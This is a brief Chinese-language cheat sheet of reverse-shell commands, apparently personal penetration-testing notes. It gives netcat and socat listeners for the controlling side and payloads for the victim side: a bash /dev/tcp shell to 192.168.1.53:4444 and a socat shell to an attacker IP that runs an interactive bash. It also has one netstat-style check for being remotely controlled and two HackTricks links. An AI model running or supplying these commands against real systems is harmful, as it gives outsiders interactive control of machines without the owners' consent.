## 控制端 （被控端连上以后，就可以操作被控端了）

    nc -vnlp 4444

## 被控端

    bash -i >& /dev/tcp/192.168.1.53/4444 0>&1

## 检查是否被远控

    netcat -antup

## 介绍

    https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#reverse-shell

## 控制端

    socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0

## 被控端

    socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane

## socat ssl tunnel

    https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#ssl-socat-tunnel


